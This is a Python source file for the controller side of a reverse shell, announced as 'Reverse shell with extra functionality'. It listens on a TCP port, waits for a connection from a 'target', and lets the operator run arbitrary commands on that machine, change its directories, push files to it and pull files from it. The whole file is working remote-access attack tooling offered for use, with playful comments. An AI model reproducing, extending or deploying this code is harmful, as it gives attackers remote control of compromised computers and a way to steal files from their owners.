# list for all the modules needed
module_list = ['tkinter', 'socket', 'time', 'sys', 'os']

# try to import each one
try:
	from socket import socket, AF_INET, SOCK_STREAM
	from tkinter.filedialog import askopenfile
	from os import system, name, getcwd
	from tkinter import Tk
	from time import sleep
	from sys import exit

# if one isn't found, display the ones needed and exit
except ModuleNotFoundError:
	print("[-] Sorry!! You need these modules for the program to work :(")
	# print 'em out
	for module in module_list:
		print("[+] {}".format(module))
		
	print("\n[+] Hope to see you soon!")
	exit()		

# stop hanging empty window with file dialogue
Tk().withdraw()

# define a constant help message
HELP_MESSAGE = """

[!] Any normal commands! [!]
[!] upload [!]
[!] download <filename> [!]

[#] exit_shell to exit! [#]
Enjoy! ^^
"""

# define a wait time for network operations, allows it to go smooooth
WAIT_TIME = 0.05
# define the windows string used in os.name
WINDOWS = "nt"

# function for clearing the screen on 'cls' or 'clear' command
def clear_screen():
	if(name == WINDOWS):
		system("cls")
		return;

	system("clear")

# function for receiving raw data, raw bytes
def receive_raw(server_socket: socket) -> bytes:
	# get the length
	length = server_socket.recv(1024).decode()
	# use the defined wait time for smoooothness
	sleep(WAIT_TIME)
	# get the raw data using the length obtained above
	raw_data = server_socket.recv(int(length))
	# return the raw data, no decoding
	return(raw_data)

# now, the opposite, with sending raw data, this function returns Nothing
def send_raw(server_socket: socket, raw_data: bytes) -> None:
	# you get the length of the raw data argument
	length = str(len(raw_data))
	# send it over
	server_socket.send(length.encode())
	# smoooothness
	sleep(WAIT_TIME)
	# send over the actual raw data
	server_socket.send(raw_data)

# function for receiving normal data! Returns a string
def receive_data(server_socket: socket) -> str:
	# get the length
	length = server_socket.recv(1024).decode()
	# smooOOTHNESS
	sleep(WAIT_TIME)
	# get the actual data with the length obtained above
	data = server_socket.recv(int(length)).decode()
	# return that data
	return(data)

# function for sending normal data! Returns nothing, again-
def send_data(server_socket: socket, data: str) -> None:
	# get the length
	length = str(len(data))
	# seeeend it over
	server_socket.send(length.encode())
	# SMOOTHNE-
	sleep(WAIT_TIME)
	# send over the actual data, encoded
	server_socket.send(data.encode())

# clear the screen for ulta aesthetic
clear_screen()

# define the binding address as a constant (CAN BE CHANGED!! If you really want to-)
SERVER_ADDRESS = ("127.0.0.1", 1234)

# create a socket object and bind it to the address above
server_socket = socket(AF_INET, SOCK_STREAM)
server_socket.bind(SERVER_ADDRESS)
# backlog of 1 :sunglasses:
server_socket.listen(1)

# some funky text
print("[!] Reverse shell with extra functionality! [!]")
# gotta get that plug in
print("[#] Written by cupycake-png ^^ [#]\n")

# wait for the connection then display when a connection is made, and where from
print("[/] Waiting for connection from target...")
shell_socket, shell_address = server_socket.accept()
print("[+] Obtained connection from: {} ^^\n".format(shell_address))

# get the current directory from the shell, for the prompt
current_directory = receive_data(shell_socket)

# infinity and beyoonD- loop
while(True):
	# try all this junk
	try:
		# display the prompt for the command! In format: [<current directory>] Command >>
		command = str(input("[{}] Command >> ".format(current_directory)))

		# the funky clear command
		if(command == "clear" or command == "cls"):
			clear_screen()
			continue;

		# if you want to leave (why would you want to leave) it gives you a nice lil message then breaks out the loop
		elif(command == "exit_shell"):
			print("\n[!] Exiting.. see you later! ^^ [!]")
			break;

		# help command, with the glorious help menu presented
		elif(command == "help"):
			print("[+] Help Menu [+]")
			print(HELP_MESSAGE)
			continue;

		# if you want to change directories
		elif(command.split()[0] == "cd"):
			# send over the command
			send_data(shell_socket, command)
			# but then receive the current directory back, for the prompt
			current_directory = receive_data(shell_socket)
			continue;

		# if you want to upload some jazz
		elif(command == "upload"):
			# send over the commmaaaaaand
			send_data(shell_socket, command)

			# open file dialogue for ease :sunglasses:
			file = askopenfile(mode="rb")
			# split the name
			split = file.name.split("/")
			# get the actual file name
			filename = split[len(split) - 1]

			# send over the file name
			send_data(shell_socket, filename)
			# get the file bytes
			file_bytes = file.read()
			# close the darn thing
			file.close()

			# send over the file bytes!! This is why we needed a function for sending raw data
			send_raw(shell_socket, file_bytes)
			# get the response and display it!!
			response = receive_data(shell_socket)
			print(response)
			continue;

		# if you want to download some jazzz
		elif(command.split()[0] == "download"):
			# send over the command- again
			send_data(shell_socket, command)

			# grab the response, most of it happens on client side
			response = receive_data(shell_socket)
			print(response)

			# if the response is good! I always use [+] shush
			if(response[:3] == "[+]"):
				# get the file bytes from the client (raw data-)
				file_bytes = receive_raw(shell_socket)

				# try to-
				try:
					# open a file with the name provided by the user, write bytes mode (raw dATA-)
					file = open(command.split()[1], "wb")
					# open this file and write to it the bytes
					file.write(file_bytes)
					# close the loser
					file.close()
					# display where it was saved!! success!!!
					print("[+] Saved file in {} ^^".format(getcwd()))

				# if it failed because you suck (could be more specific but eh im lazy)
				except Exception as e:
					# display the errror :sunglasses:
					print("[-] Error saving file: {} :(".format(e))

			# carry on with the whole command stuff
			continue;

		# if a command was actually provided and it wasn't any of the above, do this stuff
		if(command):
			# send over the coMMAND-
			send_data(shell_socket, command)

			# get the output
			output = receive_data(shell_socket)
			# display the output
			print(output)

	# if, while doing this, you decide to press CTRL + C (how dare you)
	except KeyboardInterrupt:
		# display what's goin on
		print("\n\n[-] Ended with CTRL+C ^^")

		# try to-
		try:
			# close the socket then break out
			shell_socket.close()
			break;

		# if you cant do that-
		except Exception:
			# VIOLENTLY BREAK OUT WITHOUT CLEANING UP ANYTHING
			break;